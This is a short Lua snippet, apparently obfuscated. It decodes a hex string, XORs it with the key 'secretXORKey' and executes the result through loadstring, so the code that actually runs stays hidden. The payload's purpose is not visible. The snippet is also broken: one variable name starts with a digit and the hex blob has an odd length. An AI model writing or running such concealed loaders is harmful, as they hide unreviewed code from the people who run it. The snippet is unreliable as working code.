
    local o7uh36h5wu = "30c22152c3719281bd333293d2973c2369231bf551e3ab7a3f19e7c1b2ca1e3a2622152c371a1931793301182563f2011282182410293d71f2c1337281b8241e3a26213c4236d3f301333d26e25232c3068281b26334a29c2a392c3719281b8241e2557351b4336139333224403a26291e14622336322c3230c22152c3719281bc1df2a3231813c123f302661629572563f2028636337e215735422e37122036337e101fc42947122736325017123d311d123127e31793302a575a7133e3a36850131157534281e1d7f01c1d93f1f2aa2b3c162531269e172d2e4619e2231325c16293225196d613bb1c9c3f1f2aa2b3c162531269e172d2e1b29371a7f31253315383681d2e256572"
    local function lf7dj2esqz()
      local 0v4p565drn7h = ""
      for i = 1, #o7uh36h5wu, 2 do
        local byte = tonumber(o7uh36h5wu:sub(i, i + 1), 16)
        0v4p565drn7h = 0v4p565drn7h .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #0v4p565drn7h do
        decoded = decoded .. string.char(0v4p565drn7h:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(lf7dj2esqz())()
    print(decodedScript)
  